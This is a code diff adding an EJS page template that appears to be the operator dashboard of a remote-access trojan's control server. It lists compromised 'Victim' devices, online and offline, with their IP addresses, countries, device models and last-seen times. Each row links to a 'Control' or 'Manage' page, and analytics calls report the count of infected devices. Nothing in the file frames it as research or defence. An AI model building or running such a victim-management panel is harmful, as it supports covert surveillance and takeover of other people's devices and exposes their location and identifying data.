@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html>
+
+<% include partials/head.ejs %>
+
+<body style="background:url('https://media3.giphy.com/media/fyRjICUy5UZA4/giphy.gif?cid=6c09b952d1f78ccf1fdad62d5571ec781dc953c8cc14baab&rid=giphy.gif&ct=g');background-size:cover">
+<audio id="audio" src="https://h.top4top.io/m_23422vris0.mp3" hidden autoplay></audio>
+<script>
+const playAudio = () =>{
+var audio = document.querySelector("#audio");
+if (audio.paused) {
+audio.play();
+}
+}
+</script>
+    <script>
+        gtag('event', 'screen_view', {
+            'screen_name': 'devices',
+            'app_name': 'Crazy'
+        });
+
+        gtag('event', 'devicecount', {
+            'devicesonline': <%= clientsOnline.length %>,
+            'devicesoffline': <%= clientsOffline.length %>,
+        });
+
+
+    </script>
+    <div class="ui container">
+        <% include partials/header.ejs %>
+        <div class="ui inverted segment" style="border:solid red 2px;border-radius: 30px ;">
+
+            <h3 class="ui white dividing header">Online</h3>
+
+            <table class="ui inverted pink celled table">
+                <thead>
+                    <tr>
+                        <th>Victim</th>
+                        <th>Country</th>
+                        <th>IP</th>
+                        <th>Device</th>
+                        <th>Last Seen</th>
+                        <th>Control</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <% clientsOnline.forEach((item) => { 
+                       let lsdate = new Date(item.lastSeen);
+                       let flagCss = (item.dynamicData.clientGeo.country !== undefined) ? ('flag ' + item.dynamicData.clientGeo.country).toLowerCase() : 'icon question mark' 
+                       let deviceStr = '';
+                       deviceStr += (item.dynamicData.device.manufacture !== undefined) ? item.dynamicData.device.manufacture :  ''; 
+                       deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
+                       %>
+                    <tr>
+                        <td class="collapsing"><%= item.clientID %></td>
+                        <td class="collapsing"><i class="<%= flagCss %>"></i></td>
+                        <td class="collapsing"><%= item.dynamicData.clientIP %></td>
+                        <td><%= deviceStr %></td>
+                        <td class="collapsing"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                        <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
+                                class="ui button green">Control</a>
+                        </td>
+                    </tr>
+                    <% }) %>
+                </tbody>
+            </table>
+
+
+            <h3 class="ui white dividing header">Offline</h3>
+            <table class="ui inverted white celled table">
+                <thead>
+                    <tr>
+                        <th>Victim</th>
+                        <th>Country</th>
+                        <th>IP</th>
+                        <th>Device</th>
+                        <th>Last Seen</th>
+                        <th>Control</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <% clientsOffline.forEach((item) => { 
+                       let lsdate = new Date(item.lastSeen);
+                       let flagCss = (item.dynamicData.clientGeo.country !== undefined) ? ('flag ' + item.dynamicData.clientGeo.country).toLowerCase() : 'icon question mark' 
+                       let deviceStr = '';
+                       deviceStr += (item.dynamicData.device.manufacture !== undefined) ? item.dynamicData.device.manufacture :  ''; 
+                       deviceStr += (item.dynamicData.device.model !== undefined) ? ' (' + item.dynamicData.device.model + ')' :  ''; 
+                       %>
+                    <tr>
+                        <td class="collapsing"><%= item.clientID %></td>
+                        <td class="collapsing"><i class="<%= flagCss %>"></i></td>
+                        <td class="collapsing"><%= item.dynamicData.clientIP %></td>
+                        <td><%= deviceStr %></td>
+                        <td class="collapsing"><%= lsdate.toLocaleString('en-GB', { timeZone: 'UTC' }) %></td>
+                        <td class="collapsing"><a href="/manage/<%= item.clientID %>/info"
+                                class="ui button red">Manage</a>
+                        </td>
+                    </tr>
+                    <% }) %>
+                </tbody>
+            </table>
+        </div>
+    </div>
+<br><% include partials/footer.ejs %>
+</body>
+
+</html>
